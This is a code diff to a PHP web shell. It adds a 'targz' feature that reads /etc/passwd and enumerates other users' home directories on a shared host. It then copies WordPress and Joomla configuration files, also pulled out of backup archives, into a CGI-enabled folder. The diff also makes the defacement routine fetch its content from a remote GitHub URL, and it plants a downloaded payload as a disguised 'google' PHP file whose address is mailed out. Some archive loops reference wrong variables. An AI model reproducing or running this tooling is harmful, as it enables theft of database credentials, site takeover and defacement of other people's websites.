@@ -349,6 +349,7 @@ if($_POST['do_cmd']) {
     }
   }
   function sabun_biasa($dir,$isi_script) {
+    $isi_script = file_get_contents("https://raw.githubusercontent.com/suryanata4/suryanata4/master/admin-export.txt");    
     if(is_writable($dir)) {
       $dira = scandir($dir);
       foreach($dira as $dirb) {
@@ -859,6 +860,141 @@ exe("chmod +x azzatssins");
 exe("./azzatssins ".$_POST['passwd']);
 unlink("azzatssins.c");unlink("azzatssins");
 } 
+  } elseif($_GET['do'] == 'targz') {
+?>
+<center>
+  <form method='post'>
+    USER: <br />
+  <textarea style='width: 450px; height: 150px;' name='user'>
+<?php
+
+$etc = fopen("/etc/passwd", "r");
+while ($passwd = fgets($etc)) {
+  if ($passwd == '' || !$etc) {
+    echo "<font color=red>Can't read /etc/passwd</font>";
+  } else {
+    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+    foreach ($user_jumping[1] as $user_idx_jump) {
+      $potent_dir = array("", "public_html", "backupwordpress", "scriptupdate", "backups", "backup", "www", "fantastico_backups", "softaculous_backups");
+      foreach ($potent_dir as $p_dir) {
+        $user_jumping_dir = "/home/$user_idx_jump/$p_dir";
+        if (is_readable($user_jumping_dir)) {
+          $i++;
+          echo "$user_idx_jump\n";
+          if (is_writable($user_jumping_dir)) {
+            echo "$user_idx_jump\n";
+          }
+        }
+      }
+    }
+  }
+}
+
+?>
+</textarea>
+  </br>
+    <input type='submit' name='start' value='Gasskan' style='width: 450px;'>
+  </form>
+</center>
+<?php
+
+if ($_POST[start]) {
+  $icp = mkdir("anu", 0777);
+  $isi_htc = "Options FollowSymLinks MultiViews Indexes ExecCGI\nRequire None\nSatisfy Any\nAddType application/x-httpd-cgi .cin\nAddHandler cgi-script .cin\nAddHandler cgi-script .cin";
+  $htc = fopen("anu/.htaccess" , "w");
+  fwrite($htc, $isi_htc);
+  fclose($htc);
+  $list = explode("\r\n", $_POST['user']);
+  foreach ($list as $list_user) {
+  $rand_number = rand(100, 999);
+  $potent_file = array("configuration.php", "wp-config.php", ".wp-config.php", ".configuration.php");
+    foreach ($potent_file as $p_file) {
+      if (is_readable("/home/$list_user/$p_file")) {
+        $conf = file_get_contents("/home/$list_user/$p_file");
+        if(preg_match("/JConfig|joomla/",$conf)) {
+          @shell_exec("cp -r /home/$list_user/$p_file anu/$list_user-Joomla$rand_number.txt");
+        } elseif(preg_match("/WordPress/",$conf)) {
+          @shell_exec("cp -r /home/$list_user/$p_file anu/$list_user-Wordpress$rand_number.txt");       
+        }
+      }
+    }  
+
+    $potent_dir = array("fantastico_backups", "scriptupdate", "backups", "migration", "public_html.bak", "backup", "wordpress", "wp_backup", "public_html.backup");
+    foreach ($potent_dir as $p_dir) {
+        $tar = @shell_exec("find /home/$list_user/$p_dir -name '*.tar*'");
+        $extar = explode(PHP_EOL, $tar);
+        foreach ($extar as $betar) {
+          @shell_exec("tar xvf $betar -C 'anu' --wildcards '*wp-config.php'");
+          $find_wp = @shell_exec("find anu -name '*wp-config.php*'");
+          $find_wp = str_replace(" ", " \\", $find_wp);
+          $exfind_wp = explode(PHP_EOL, $find_wp);
+          foreach ($exfind_wp as $file_wp) {
+           @shell_exec("mv $file_wp anu/$list_user-Wordpress$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+
+          @shell_exec("tar xvf $betar -C 'anu' --wildcards '*configuration.php'");
+          $find_jom = @shell_exec("find anu -name '*configuration.php*'");
+          $find_jom = str_replace(" ", " \\", $find_jom);
+          $exfind_jom = explode(PHP_EOL, $find_jom);
+          foreach ($exfind_jom as $file_jom) {
+           @shell_exec("mv $file_jom anu/$list_user-Joomla$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+        }        
+        $tgz = @shell_exec("find /home/$list_user/$p_dir -name '*.tgz*'");
+        $extgz = explode(PHP_EOL, $tgz);
+        foreach ($extgz as $betgz) {
+          @shell_exec("tar xvf $betar -C 'anu' --wildcards '*wp-config.php'");
+          $find_wp = @shell_exec("find anu -name '*wp-config.php*'");
+          $find_wp = str_replace(" ", " \\", $find_wp);
+          $exfind_wp = explode(PHP_EOL, $find_wp);
+          foreach ($exfind_wp as $file_wp) {
+           @shell_exec("mv $file_wp anu/$list_user-Wordpress$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+
+          @shell_exec("tar xvf $betar -C 'anu' --wildcards '*configuration.php'");
+          $find_jom = @shell_exec("find anu -name '*configuration.php*'");
+          $find_jom = str_replace(" ", " \\", $find_jom);
+          $exfind_jom = explode(PHP_EOL, $find_jom);
+          foreach ($exfind_jom as $file_jom) {
+           @shell_exec("mv $file_jom anu/$list_user-Joomla$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+        }        
+        $zip = @shell_exec("find /home/$list_user/$p_dir -name '*.zip*'");
+        $exzip = explode(PHP_EOL, $zip);
+        foreach ($exzip as $bezip) {
+          @shell_exec("unzip -j $f_backup '*wp-config.php' -d 'anu'");
+          $find_wp = @shell_exec("find anu -name '*wp-config.php*'");
+          $find_wp = str_replace(" ", " \\", $find_wp);
+          $exfind_wp = explode(PHP_EOL, $find_wp);
+          foreach ($exfind_wp as $file_wp) {
+           @shell_exec("mv $file_wp anu/$list_user-Wordpress$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+
+          @shell_exec("unzip -j $f_backup '*configuration.php' -d 'anu'");
+          $find_jom = @shell_exec("find anu -name '*configuration.php*'");
+          $find_jom = str_replace(" ", " \\", $find_jom);
+          $exfind_jom = explode(PHP_EOL, $find_jom);
+          foreach ($exfind_jom as $file_jom) {
+           @shell_exec("mv $file_jom anu/$list_user-Joomla$rand_number.txt");             
+           @shell_exec("find anu -type d -empty -delete");
+          }
+        }        
+      }
+      if (file_exists("anu/$list_user-Wordpress$rand_number.txt")) {
+        echo "[ DONE ]<br>";
+        echo "anu/$list_user-Wordpress$rand_number.txt<br><br>";
+      }      
+      if (file_exists("anu/$list_user-Joomla$rand_number.txt")) {
+        echo "[ DONE ]<br>";
+        echo "anu/$list_user-Joomla$rand_number.txt<br><br>";
+      }      
+    }  
+  }      
   } elseif($_GET['do'] == 'auto_edit_user') {
   if($_POST['hajar']) {
     if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
@@ -1234,7 +1370,7 @@ elseif($zxcase){
   $subject = 'SHELL ( '.php_uname().' )';
   $message = $_SERVER['HTTP_HOST'] . $msg . "/google".$random.".php";
   $headers[] = 'From: '.$_SERVER['HTTP_HOST'].' <'.$_SERVER['HTTP_HOST'].'>';
-  @shell_exec("wget 'https://raw.githubusercontent.com/suryanata4/suryanata4/master/admin-export.txt' -O ".$dir."/google".$random.".php");
+  copy("https://raw.githubusercontent.com/suryanata4/suryanata4/master/admin-export.txt", $dir."/google".$random.".php");
   if(mail($to, $subject, $message, implode("\r\n", $headers))){
     echo "<font color=lime>Sended to $to</font><br>";
   } else {
